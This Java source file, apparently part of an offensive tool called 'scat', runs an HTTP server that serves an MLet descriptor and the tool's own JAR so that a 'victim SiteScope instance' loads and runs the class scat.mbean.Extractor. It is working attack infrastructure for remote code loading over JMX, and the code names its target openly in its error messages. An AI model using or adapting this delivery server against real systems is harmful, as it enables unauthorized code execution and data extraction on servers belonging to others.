/*
 * Copyright (C) 2017 hantwister
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package scat.mlet;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URL;
import org.apache.commons.io.IOUtils;
import scat.mbean.Extractor;

/**
 *
 * @author hantwister
 */
public class HTTPServer {

    public static final int HTTP_PORT = 18080;

    private static HTTPServer INSTANCE = null;

    public static void startInstance() throws IOException {
        synchronized (HTTPServer.class) {
            if (INSTANCE == null) {
                INSTANCE = new HTTPServer();
            }
        }
    }

    private HTTPServer() throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(HTTP_PORT), 0);
        server.createContext("/mlet", new MletHandler());
        server.createContext("/scat.jar", new JarHandler());
        server.start();
    }

    private class MletHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange he) throws IOException {
            // Send a mlet response pointing to scat.jar (which will be this JAR file) and scat.mbean.Extractor

            String response = "<mlet code=scat.mbean.Extractor archive=scat.jar name=" + Extractor.OBJECT_NAME + " ></mlet>";
            he.sendResponseHeaders(200, response.length());
            try (OutputStream os = he.getResponseBody()) {
                os.write(response.getBytes());
            }
        }
    }

    private class JarHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange he) throws IOException {
            // Locate the JAR file we're in

            URL classURL = HTTPServer.class.getResource('/' + HTTPServer.class.getName().replace('.', '/') + ".class");

            if (!classURL.getProtocol().equalsIgnoreCase("jar")) {
                System.err.println("This tool is not being run from a JAR.");
                System.err.println("It is designed to provide a JAR of itself to the victim SiteScope instance.");
                System.err.println("Please build a JAR, and relaunch from that.");

                he.sendResponseHeaders(500, 0);
                he.getResponseBody().close();

                return;
            }

            String classPath = classURL.getPath();
            URL jarURL = new URL(classPath.substring(0, classPath.lastIndexOf('!')));
            File jarFile = new File(jarURL.getPath());

            if (!jarFile.exists()) {
                System.err.println("Unknown error obtaining a reference to this JAR.");

                System.err.println("classURL = " + classURL);
                System.err.println("classPath = " + classPath);
                System.err.println("jarURL = " + jarURL);
                System.err.println("jarFile = " + jarFile);

                he.sendResponseHeaders(500, 0);
                he.getResponseBody().close();

                return;
            }

            // Send the JAR file on its way
            he.sendResponseHeaders(200, jarFile.length());
            try (OutputStream os = he.getResponseBody()) {
                IOUtils.copy(new FileInputStream(jarFile), os);
            }
        }
    }
}
